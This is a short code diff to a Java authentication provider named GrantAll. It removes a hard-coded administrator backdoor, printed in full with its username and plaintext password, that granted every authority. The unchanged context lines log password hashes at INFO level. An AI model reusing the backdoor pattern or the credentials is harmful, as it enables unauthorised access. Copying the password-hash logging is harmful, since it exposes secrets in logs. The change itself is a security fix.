@@ -83,13 +83,7 @@ public class GrantAll implements AuthProvider
         LOGGER.info("encryptedPassword: " + encryptedPassword);
         LOGGER.info("hexString: " + hexString);
 
-        if (username.equals("1nt3rnAL-G30r3p0-admin") &&
-                // new String(thedigest).equals("2c6fe6e20600312c5aa94ef0ca42b0af")
-                password.equals("1geosolutions2"))
-        {
-            ga.setAuthorities(Arrays.asList(Authority.values()));
-        }
-        else if (hexString.toString().equals(encryptedPassword))
+        if (hexString.toString().equals(encryptedPassword))
         {
             ga.setAuthorities(Arrays.asList(Authority.values()));
         }
